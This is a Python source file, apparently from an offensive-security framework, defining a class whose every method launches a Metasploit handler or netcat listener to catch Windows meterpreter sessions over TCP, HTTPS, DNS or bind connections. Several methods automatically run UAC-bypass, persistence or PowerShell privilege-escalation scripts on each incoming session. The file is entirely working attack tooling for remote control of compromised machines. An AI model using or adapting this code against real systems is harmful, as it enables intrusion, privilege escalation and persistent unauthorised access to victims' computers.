import os

class METASPLOIT(object):
    def __init__(self):
        if os.geteuid() == 0:
            self.placeholder = ''
        else:
            self.placeholder = 'sudo '

    ########Reverse########
    def metrev_uac(self,portnum):
        os.system('%smsfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j\'' %(self.placeholder, portnum))
    def metrev_allchecks(self,portnum):
        os.system('%smsfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript post/windows/manage/exec_powershell SCRIPT=allchecks.ps1;set ExitOnSession false;exploit -j\'' %(self.placeholder, portnum))
    def metrev_persistence(self,portnum):
        os.system('%smsfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc persist.rc;set ExitOnSession false;exploit -j\'' %(self.placeholder, portnum))
    def metrev_normal(self,portnum):
        os.system('%smsfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set ExitOnSession false; exploit -j\'' %(self.placeholder, portnum))
    ########Bind########
    def metbind_uac(self,bindport,bindip):
        os.system('%smsfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j\'' % (self.placeholder, bindport, bindip))
    def metbind_allchecks(self,bindport,bindip):
        os.system('%smsfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript post/windows/manage/exec_powershell SCRIPT=allchecks.ps1;set ExitOnSession false;exploit -j\'' % (self.placeholder, bindport, bindip))
    def metbind_persistence(self,bindport,bindip):
        os.system('%smsfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript multi_console_command -rc persist.rc;set ExitOnSession false;exploit -j\'' % (self.placeholder, bindport, bindip))
    def metbind_normal(self,bindport,bindip):
        os.system('%smsfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set ExitOnSession false; exploit -j \'' % (self.placeholder, bindport, bindip))
    ########Http########
    def methttps_uac(self,portnum):
        os.system('%smsfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j\'' % (self.placeholder, portnum))
    def methttps_allchecks(self,portnum):
        os.system('%smsfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LPORT %s;set LHOST 0.0.0.0;set autorunscript post/windows/manage/exec_powershell SCRIPT=allchecks.ps1;set ExitOnSession false;exploit -j\'' % (self.placeholder, portnum))
    def methttps_persistence(self,portnum):
        os.system('%smsfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc persist.rc;set ExitOnSession false;exploit -j\'' % (self.placeholder, portnum))
    def methttps_normal(self,portnum):
        os.system('%smsfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LPORT %s;set LHOST 0.0.0.0;set ExitOnSession false; exploit -j\'' % (self.placeholder, portnum))
    ########DNS########
    def metdns_uac(self,portnum,DNSaddr):
        os.system('%smsfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp_dns;set LPORT %s;set LHOST %s;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j\'' %(self.placeholder, portnum,DNSaddr))
    def metdns_allchecks(self,portnum,DNSaddr):
        os.system('%smsfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp_dns;set LPORT %s;set LHOST %s;set autorunscript post/windows/manage/exec_powershell SCRIPT=allchecks.ps1;set ExitOnSession false;exploit -j\'' %(self.placeholder, portnum,DNSaddr))
    def metdns_persistence(self,portnum,DNSaddr):
        os.system('%smsfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp_dns;set LPORT %s;set LHOST %s;set autorunscript multi_console_command -rc persist.rc;set ExitOnSession false; exploit -j\'' %(self.placeholder, portnum,DNSaddr))
    def metdns_normal(self,portnum,DNSaddr):
        os.system('%smsfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp_dns;set LPORT %s;set LHOST %s;set ExitOnSession false; exploit -j\'' %(self.placeholder, portnum,DNSaddr))
    ########NC#######
    def nclisterner(self,portnum):
        os.system('%snc -lvp %s'%(self.placeholder, portnum))
